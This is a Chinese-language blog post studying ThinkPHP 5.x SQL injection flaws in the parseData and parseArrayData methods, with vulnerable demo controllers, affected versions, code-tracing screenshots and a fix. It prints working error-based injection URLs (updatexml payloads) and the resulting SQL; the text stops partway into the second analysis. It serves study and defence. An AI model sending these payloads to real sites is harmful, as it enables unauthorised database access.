@@ -1,0 +1,1177 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="R0ser1">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="R0ser1">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="ThinkPHP5.x注入漏洞学习  前言 以下复现均需要在application&#x2F;database.php 文件中配置数据库相关信息，并开启 **application&#x2F;config 中的 ** app_debug 和 app_trace   通过以下命令获取测试环境代码： 1composer create-project --prefer-dist topthink&#x2F;think&#x3D;版本 tpde">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP5.x注入漏洞学习">
+<meta property="og:url" content="http://example.com/2021/08/03/ThinkPHP5-x%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ThinkPHP5.x注入漏洞学习  前言 以下复现均需要在application&#x2F;database.php 文件中配置数据库相关信息，并开启 **application&#x2F;config 中的 ** app_debug 和 app_trace   通过以下命令获取测试环境代码： 1composer create-project --prefer-dist topthink&#x2F;think&#x3D;版本 tpde">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt3g80sxwij310d0h17dv.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/00774lbQly1gt3fseyvdmj31650nj7l8.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gt3fslm26aj315t0geti5.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gt3fsrfeecj31780jzk5i.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt3fsx00djj30zv08vaf2.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gt3ft2myroj31dn065n04.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gt3ftiag7jj31040xr17v.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gt3ftr0gfkj31f80l5tif.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/00774lbQly1gt3fu1n5vxj31f20jktln.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00774lbQly1gt3fu6t5qfj310m06j78g.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00774lbQly1gt3fubq688j314z0c9jxj.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/00774lbQly1gt3fug5lyfj317t0m2qfj.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gt3fukvrsbj313h0ein5e.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gt3fuqozknj31810kiaiq.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fuw6spzj31810idthw.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00774lbQly1gt3fv31e8kj30xa0qa16z.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/00774lbQly1gt3fv8noi2j31340eswns.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt3fvdluckj312n0ntapq.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/00774lbQly1gt3fvogs3jj31041fgx08.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gt3fvv3s45j31040l4ds6.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fw6wmyij30w00mz16m.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gt3fwd39jyj30wf0ksgw6.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00774lbQly1gt3fwilan2j315k0ko4dq.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fwobi2qj313n0n5wv7.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gsxo53cothj30zx0lq47e.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gt3fwzysbrj31ez0g9k39.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gt3fx4lok0j31250m6h1o.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt3fxccajnj31em0ewtj4.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gt3fxi3hkrj30kw0fl0z0.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fxmmvv4j30v10ig7fp.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gt3fxuqwscj31040zjqh6.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gt3fy1n4bcj31ew0iz7cm.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gt3fyd093xj30zt0fdjyq.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt3fyhgtilj618v0edn7c02.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt3fylunssj61f10iotk202.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt3fyqmr1rj31320f6tis.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt3fyv8nxoj310w0dek0k.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fyzcw7lj31600g4wou.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/00774lbQly1gt3fz3zj08j315o0dntgb.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fz9qv0rj31500knk5m.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gt3fzfzebpj31041citx0.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt3fztc3nfj31da0aj43z.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gt3fzyphlfj31es0fyame.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gt3g057wp3j30us0mch39.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gt3g0b2378j31du0fyk4a.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gt3g0g0e0yj316x0n5nh6.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gt3g0lvgi5j31790giqdj.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gt3g0qh080j311w0bktej.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gt3g0uvk90j30s009v42o.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gt3g0zfjoyj315j0j0wom.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gt3g14361tj31b50b648i.jpg">
+<meta property="article:published_time" content="2021-08-03T03:35:00.000Z">
+<meta property="article:modified_time" content="2021-08-03T03:46:39.574Z">
+<meta property="article:author" content="R0ser1">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="ThinkPHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt3g80sxwij310d0h17dv.jpg">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>ThinkPHP5.x注入漏洞学习 · R0ser1&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20210204" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20210204" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "https://tva2.sinaimg.cn/large/00774lbQly1gsk7gp4qw1j30qo0qojtw.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js?v=20210204" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    <script src="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.3/js/all.min.js"  data-auto-replace-svg="nest" ></script>
+    
+    <!-- fancybox -->
+    <script src="https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <!-- top read progress line -->
+    <div class="header-element">
+        
+        <div class="read-progress"></div>
+        
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+        <div class="header-sidebar-menu">
+        
+            
+            <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- back to home page text -->
+    <a class="home-link header-element" href=/>R0ser1's Blog</a>
+    <!-- toggle banner for post layout -->
+    
+    
+    <div class="banner">
+    
+        <div class="blog-title header-element">
+            <a href="/" >R0ser1&#39;s Blog</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">ThinkPHP5.x注入漏洞学习</a>
+        </div>
+    </div>
+    
+</header>
+    
+<footer class="footer-fixed">
+
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+        <div class="back-top">
+        
+            
+            <div>&#xe639;</div>
+            
+        </div>
+    </div>
+</footer>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://tvax1.sinaimg.cn/large/00774lbQly1gsk7i9yw6zj31z413jgra.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            ThinkPHP5.x注入漏洞学习
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "代码审计">代码审计</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ThinkPHP">ThinkPHP</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">3.1k</span>Reading time: <span class="post-count reading-time">13 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/08/03</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <center>ThinkPHP5.x注入漏洞学习</center>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>以下复现均需要在<strong>application/database.php</strong> 文件中配置数据库相关信息，并开启 **application/config 中的 ** <strong>app_debug</strong> 和 <strong>app_trace</strong> </p>
+</blockquote>
+<p>通过以下命令获取测试环境代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=版本 tpdemo</span><br></pre></td></tr></table></figure>
+
+<p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下，之后执行一次 <code>composer update</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line"></span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;漏洞版本&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="ThinkPHP-ParseData-方法注入"><a href="#ThinkPHP-ParseData-方法注入" class="headerlink" title="ThinkPHP ParseData 方法注入"></a>ThinkPHP ParseData 方法注入</h1><h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>本次漏洞存在于 <strong>Builder 类的 parseData 方法中</strong>。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生（<strong>insert</strong> 和<strong>update</strong>）注入，本文以insert注入为例。</p>
+<p>洞影响版本： <strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> 、 <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong> 。</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$level</span>=input(<span class="string">&quot;level/a&quot;</span>);</span><br><span class="line"><span class="comment">//        $data=db(&quot;users&quot;)-&gt;where(&quot;id&quot;,&quot;1&quot;)-&gt;insert([&quot;level&quot;=&gt;$level]);</span></span><br><span class="line">        <span class="variable">$data</span>=db(<span class="string">&quot;users&quot;</span>)-&gt;where(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;1&quot;</span>)-&gt;update([<span class="string">&quot;level&quot;</span>=&gt;<span class="variable">$level</span>]);</span><br><span class="line">        dump(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://yoursite/index.php/index/index?level[0]=inc&amp;level[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;level[2]=1</code></p>
+<p>即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的）</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3g80sxwij310d0h17dv.jpg" alt="image-20210731201318806"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们直接跟进到<code>insert</code></p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt3fseyvdmj31650nj7l8.jpg" alt="image-20210731204914843"></p>
+<p>继续跟进<code>$this-&gt;builder-&gt;insert</code></p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gt3fslm26aj315t0geti5.jpg" alt="image-20210731205528040"></p>
+<p>继续跟进<code>$this-&gt;parseData</code></p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt3fsrfeecj31780jzk5i.jpg" alt="image-20210731210557849"></p>
+<p>因为我们是数组所以进入这里，然后没有任何的过滤导致直接赋值给<code>$result[$item]</code></p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fsx00djj30zv08vaf2.jpg" alt="image-20210731210959068"></p>
+<p>然后我们这三种case都可以造成sql注入</p>
+<p>但是熟悉tp3的师傅们都熟悉。<code>I函数</code>接受的时候会有<code>htmlspecialchars </code>和 <code>think_filter</code> 的过滤处理</p>
+<p>tp5一样也是有的<code>filterExp</code>，会将我们<code>EXP</code>=&gt;<code>EXP空格</code> 因此就匹配不上了</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3ft2myroj31dn065n04.jpg" alt="image-20210731211702335"></p>
+<p>回到<code>library/db/Buider.php</code>中然后返回的sql语句结果为，从而造成SQL注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO &#96;users&#96; (&#96;level&#96;) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)+1) </span><br></pre></td></tr></table></figure>
+
+<p>最后来一张攻击总结流程【图来自七月火前辈】</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3ftiag7jj31040xr17v.jpg" alt="9"></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt3ftr0gfkj31f80l5tif.jpg" alt="20210305100924794"></p>
+<h1 id="ThinkPHP-ParseArrayData-方法注入"><a href="#ThinkPHP-ParseArrayData-方法注入" class="headerlink" title="ThinkPHP ParseArrayData 方法注入"></a>ThinkPHP ParseArrayData 方法注入</h1><h2 id="漏洞概要-1"><a href="#漏洞概要-1" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>本次漏洞存在于 <strong>Mysql 类的 parseArrayData 方法</strong>中由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生（ <strong>update</strong> 方法注入）</p>
+<p>影响版本：<strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7 (非最新的 5.1.8 版本也可利用)</strong></p>
+<h2 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$level</span>=input(<span class="string">&quot;level/a&quot;</span>);</span><br><span class="line">        <span class="variable">$data</span>=db(<span class="string">&quot;users&quot;</span>)-&gt;where(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;1&quot;</span>)-&gt;update([<span class="string">&quot;level&quot;</span>=&gt;<span class="variable">$level</span>]);</span><br><span class="line">        dump(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://yoursite/index.php/index/index?level[0]=point&amp;level[1]=1&amp;level[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;level[3]=0</code></p>
+<p>即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的）</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt3fu1n5vxj31f20jktln.jpg" alt="image-20210801131502459"></p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们直接到<code>library/think/db/</code><strong>Query</strong>类的<strong>update</strong>方法</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt3fu6t5qfj310m06j78g.jpg" alt="image-20210801144104009"></p>
+<p>我们继续跟进<strong>Connection</strong> 类的 <strong>update</strong> 方法，该方法又调用了 <strong>$this-&gt;builder</strong> 的 <strong>update</strong> 方法。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt3fubq688j314z0c9jxj.jpg" alt="image-20210801143035326"></p>
+<p>我们直接跟进吧</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt3fug5lyfj317t0m2qfj.jpg" alt="image-20210801144534583"></p>
+<p>我们又看到<code>parseData</code>方法。5.0.19的SQL注入就是在这里产生的。我们跟进去看一下</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt3fukvrsbj313h0ein5e.jpg" alt="image-20210801145109994"></p>
+<p><strong>parseArrayData</strong>方法代码</p>
